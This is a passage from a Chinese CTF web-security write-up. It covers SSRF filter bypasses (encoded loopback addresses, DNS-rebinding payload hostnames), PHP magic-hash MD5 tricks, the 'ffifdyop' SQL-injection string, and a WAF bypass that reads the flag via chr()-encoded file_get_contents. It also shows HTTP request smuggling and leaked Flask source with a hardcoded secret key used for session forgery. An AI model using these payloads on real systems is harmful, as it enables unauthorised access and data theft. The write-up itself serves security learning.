构造<code>id=admin</code></p></li></ol><h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20210423211244499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>常见的符号绕过有 @ # / \ ? 多试一试。。</p><h2 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h2><p>127.0.0.1使用的是点分十进制 绕过如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>进制格式：<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>进制格式：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>进制整数格式：<span class="hljs-number">2130706433</span><br><br>特别的，在linux下，<span class="hljs-number">0</span>代表<span class="hljs-number">127.0.0.1</span>，可以用http://<span class="hljs-number">0</span>进行请求<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8进制<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16进制<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10进制整数：<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linux：<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>SSRF中有个很重要的一点是请求可能会跟随302跳转</p><p><img src="https://img-blog.csdnimg.cn/20210423211528881.png#pic_center"></p><h2 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h2><p>DNS概念略</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">TTL</span><br><span class="hljs-selector-tag">TTL</span>值全称是“生存时间（<span class="hljs-selector-tag">Time</span> <span class="hljs-selector-tag">To</span> <span class="hljs-selector-tag">Live</span>)”，简单的说它表示<span class="hljs-selector-tag">DNS</span>记录在<span class="hljs-selector-tag">DNS</span>服务器上缓存时间，数值越小，修改记录各地生效时间越快。<br><br>当各地的<span class="hljs-selector-tag">DNS</span>(LDNS)服务器接受到解析请求时，就会向域名指定的授权<span class="hljs-selector-tag">DNS</span>服务器发出解析请求从而获得解析记录；该解析记录会在<span class="hljs-selector-tag">DNS</span>(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，<span class="hljs-selector-tag">DNS</span>服务器将不再向授权<span class="hljs-selector-tag">DNS</span>服务器发出请求，而是直接返回刚才获得的记录；而这个记录在<span class="hljs-selector-tag">DNS</span>服务器上保留的时间，就是<span class="hljs-selector-tag">TTL</span>值。<br></code></pre></td></tr></table></figure><p>利用已经控制的DNS服务器 恶意DNS服务器将TTL值设置为1秒 向查询域的机器响应真实的恶意IP地址 让其缓存迅速失效 （常将访问的目标IP篡改为具有攻击性的地址）</p><p>可以让目标机器的浏览器访问恶意的网站 解析其恶意代码执行如js</p><p>下面的几个网站都是测试这个DNS重绑定漏洞的</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a><br><img src="https://img-blog.csdnimg.cn/20210423211706570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">7</span>f000001<span class="hljs-selector-class">.c0a80001</span><span class="hljs-selector-class">.rbndr</span><span class="hljs-selector-class">.us</span> #payload<br></code></pre></td></tr></table></figure><p><a href="http://xip.io/">http://xip.io/</a></p><p><img src="https://img-blog.csdnimg.cn/20210423211753175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>.xip.io #payload<br></code></pre></td></tr></table></figure><p><a href="http://ceye.io/">http://ceye.io/</a></p><p>后面跟/flag.php 题解！</p><h2 id="md5绕过-hash比较缺陷"><a href="#md5绕过-hash比较缺陷" class="headerlink" title="md5绕过(hash比较缺陷)"></a>md5绕过(hash比较缺陷)</h2><p>因为md5的特性 它有两个漏洞</p><ul><li>MD5加密后的值若开头为0e的话 则认为MD5的值相等</li></ul><p>PHP在处理哈希字符串是 使用**!=** 和 <strong>==<strong>来比较 会把每一个</strong>OE</strong>开头的字符串都解释为0（PHP的科学计数法）</p><table><thead><tr><th align="center">字符串</th><th align="center">MD5加密值</th></tr></thead><tbody><tr><td align="center">QNKCDZO</td><td align="center">0e830400451993494058024219903391</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s214587387a</td><td align="center">0e848240448830537924465865611904</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">0e215962017</td><td align="center">0e291242476940776845150308577824</td></tr></tbody></table><table><thead><tr><th align="center">字符串</th><th align="center">sha1加密值</th></tr></thead><tbody><tr><td align="center">aaroZmOk</td><td align="center">0e66507019969427134894567494305185566735</td></tr><tr><td align="center">aaK1STfY</td><td align="center">0e76658526655756207688271159624026011393</td></tr><tr><td align="center">aaO8zKZF</td><td align="center">0e89257456677279068558073954252716165668</td></tr><tr><td align="center">aa3OFF9m</td><td align="center">0e36977786278517984959260394024281014729</td></tr></tbody></table><ul><li>MD5函数不能处理数组</li></ul><p>MD5()和sha1()处理数组都会返回NULL (a[]=1)</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>原题：BUU [BJDCTF2020]Easy MD5</p><blockquote><p>Hint:“select * from ‘admin’ where password=’”.md5($pass,true)”‘”</p></blockquote><p>特殊字符串：<strong>ffifdyop</strong> <strong>129581926211651571912466741651878684928</strong></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源码首先看到<img src="https://raw.githubkil3rr/photocom/wo02ie/photo/main//2021/06/07/.png"></p><p>WAF不可知，稍后再处理；API中有calc.php，尝试访问，OK的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#黑名单解释</span><br><span class="hljs-string">/i</span> 忽略大小写<br><span class="hljs-string">/m</span>多行查找<br><span class="hljs-string">/g</span>全局匹配字符<br><span class="hljs-string">/gi</span>（<span class="hljs-string">/ig</span>)忽略大小写全局匹配字符<br></code></pre></td></tr></table></figure><p>有黑名单，需要GET传参num，可以看到有eval函数执行$_str=$_GET[‘num’]</p><p>传参试一试，<code>calc.php?num=1</code>传1可以，<code>calc.php?num=phpinfo();</code>发现传不进去，这里应该就是WAF的问题了</p><ul><li>方法一、利用字符串的解析特性</li></ul><p>学习一个知识点，就是PHP的字符串的解析特性</p><p>php在解析字符串时，需要将所有参数转换为有效的变量名，它的处理有两种，删除变量名前面的空格或者将空格和其他字符替换成下划线</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>所以说碰到WAF过滤变量里面的字母和非法字符时 可以考虑这个特性绕过</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/123456.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604202438733.png"></p><p>注意一些不能使用的函数，用var_dump()打印scandir()吧</p><p>这个scandir()也可以使用glob()</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604195744654.png"></p><p>为空！注意到刚刚calc.php的黑名单，绕过这种正则匹配的方法比较多，但不一定有效，屡试不爽的是用代码执行顺序的逻辑漏洞，即控制输入的内容为一个待执行函数，然后黑名单匹配不到字符串，代码继续执行下去时，才会解析输入内容中的函数，可以使用ascii转换 即使用chr() 函数代替字符</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604200222049.png"></p><p>看到有flag了</p><p>干脆就用chr()代替所有字符吧</p><p>读取<code>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p><p>提一嘴一些花式读取文件的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">show_source()<br>print_r(strip_whitespace())<br>readfile()<br>var_dump(file())<br><span class="hljs-keyword">include</span>()<br></code></pre></td></tr></table></figure><p>拼接即可<img src="https://raw.githubusercontkil3rr/photoie/photo/main/image-20210604201849759.png"></p><ul><li><p>方法二、HTTP走私攻击(HTTP数据接收不同步攻击)</p><p><strong>漏洞形成的原因：</strong></p></li></ul><p>前端服务器（cdn）和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞；为什么会不一致呢？</p><p>主要是处理Content-Length和Transfer-Encoding不一致，原则上同时使用两者时，Content-Length是无效的，当单个服务器时，没有任何问题，但当多个服务器时，理解的数据不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效，这样超出的长度就会拼接到下一次请求，从而导致漏洞。</p><ul><li><input checked="" disabled="" type="checkbox"> Content-Type重复绕过WAF</li></ul><p>?num=phpinfo();抓包<code>注意此处变量num前没有空� �</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213630379.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213654358.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213744574.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604214116207.png"></p><p>其他走私的姿势 具体见http走私攻击.md和http-desync-attacks-ppt.pdf</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="方法一、弱密码"><a href="#方法一、弱密码" class="headerlink" title="方法一、弱密码"></a>方法一、弱密码</h3><p>admin/123</p><p>我只能说这题太难了</p><h3 id="方法二、session伪造"><a href="#方法二、session伪造" class="headerlink" title="方法二、session伪造"></a>方法二、session伪造</h3><p>熟悉各功能点</p><p>查看首页源码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main//2021/06/08/.png"></p><p>说明这题需要admin登录 获得flag</p><p>继续测试各功能点 并查看源码 终于发现change password源码中出现网站源码泄露</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608002321159.png"></p><p>可见是flask模板 百度一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608002450573.png"></p><p>下载后的源码包遍历后，routes.py和config.py是可以利用的点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#routes.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> logout_user, LoginManager, current_user, login_user<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> app, db<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> app.models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> forms <span class="hljs-keyword">import</span> RegisterForm, LoginForm, NewpasswordForm<br><span class="hljs-keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="hljs-keyword">import</span> nodeprep<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> code <span class="hljs-keyword">import</span> get_verify_code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_code</span>():</span><br>    image, code = get_verify_code()<br>    <span class="hljs-comment"># 图片以二进制形式写入</span><br>    buf = BytesIO()<br>    image.save(buf, <span class="hljs-string">&#x27;jpeg&#x27;</span>)<br>    buf_str = buf.getvalue()<br>    <span class="hljs-comment"># 把buf_str作为response返回前端，并设置首部字段</span><br>    response = make_response(buf_str)<br>    response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/gif&#x27;</span><br>    <span class="hljs-comment"># 将验证码字符串储存在session中</span><br>    session[<span class="hljs-string">&#x27;image&#x27;</span>] = code<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, title = <span class="hljs-string">&#x27;hctf&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():<br>            flash(<span class="hljs-string">&#x27;Wrong verify code.&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form=form)<br>        <span class="hljs-keyword">if</span> User.query.filter_by(username = name).first():<br>            flash(<span class="hljs-string">&#x27;The username has been registered&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br>        user = User(username=name)<br>        user.set_password(form.password.data)<br>        db.session.add(user)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;register successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name<br>        user = User.query.filter_by(username=name).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):<br>            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        login_user(user, remember=form.remember_me.data)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    logout_user()<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/index&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])<br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        flash(<span class="hljs-string">&#x27;post successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, title = <span class="hljs-string">&#x27;edit&#x27;</span>)<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page_not_found</span>(<span class="hljs-params">error</span>):</span><br>    title = unicode(error)<br>    message = error.description<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;errors.html&#x27;</span>, title=title, message=message)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span><br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#config.py</span><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>从routes.py入手看一下index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">#index.html &#123;% include(&#x27;header.html&#x27;) %&#125; &#123;% if current_user.is_authenticated %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125; &#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27;<br>%&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br><span class="hljs-comment">&lt;!-- you are not admin --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>&#123;% include(&#x27;footer.html&#x27;) %&#125;<br></code></pre></td></tr></table></figure><p>可见 session值是admin时 我们即取得flag 那么这就涉及session伪造 在routes.py找到<code>login</code>处的<code>current_user.is_authenticated</code>通过GET或者POST登录都可以 现在要解决的就是session的问题</p><p>抓包看一下<img src="https://raw.githubusercokil3rr/photo02ie/photo/main/image-20210608100040088.png"></p><p>百度再次查找flask框架的session问题</p><blockquote><p>flask的session是通过加密之后放到了cookie中。所以有加密就有密钥用于解密，所以，只要用到了flask的session模块就一定要配置“SECRET_KEY”这个全局宏。一般设置为24位的字符。配置方法一般有两种。</p><p>配置方法一：</p><p>新建一个config.py的文件配置secret_key</p><p>config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_KEY = <span class="hljs-string">&#x27;XXXXXXXXX&#x27;</span><br></code></pre></td></tr></table></figure><p>然后在主运行文件里面添加config文件里面的内容。</p><p>main.py或者routes.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br><span class="hljs-keyword">import</span> config<br>app = Flask(__name__)<span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>.<br></code></pre></td></tr></table></figure><p>配置方法二：</p><p>直接在主运行文件里面配置。配置config的时候也是和操作字典是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 